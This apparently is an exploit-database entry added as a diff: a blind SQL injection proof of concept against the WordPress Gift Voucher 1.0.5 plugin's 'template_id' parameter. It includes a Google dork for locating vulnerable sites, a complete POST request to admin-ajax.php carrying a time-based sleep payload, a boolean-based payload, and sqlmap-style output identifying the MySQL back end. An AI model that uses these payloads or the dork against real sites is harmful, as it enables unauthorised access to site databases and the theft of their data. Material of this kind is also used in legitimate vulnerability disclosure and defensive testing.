@@ -1,0 +1,38 @@
+# Exploit Title: WordPress Plugin Gift Voucher 1.0.5 - 'template_id' SQL Injection
+# Google Dork: intext:"/wp-content/plugins/gift-voucher/"
+# Date: 2018-08-23
+# Exploit Author: Renos Nikolaou
+# Software Link: https://wordpress.org/plugins/gift-voucher/
+# Vendor Homepage: http://www.codemenschen.at/
+# Version: 1.0.5
+# Tested on: Windows 10
+# CVE: N/A
+# Description : The vulnerability allows an attacker to inject sql commands 
+# on 'template_id' parameter.
+
+# PoC - Blind SQLi :
+
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: domain.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://domain.com/gift-voucher/
+Content-Length: 62
+Cookie: PHPSESSID=efa4of1gq42g0nd9nmj8dska50; __stripe_mid=1f8c5bef-b440-4803-bdd5-f0d0ea22007e; __stripe_sid=de547b6b-fa31-46a1-972b-7b3324272a23
+Connection: close
+
+action=wpgv_doajax_front_template&template_id=1 and sleep(15)#
+
+Parameter: template_id (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: action=wpgv_doajax_front_template&template_id=1 AND 4448=4448
+    Vector: AND [INFERENCE]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+banner:    '5.5.59'
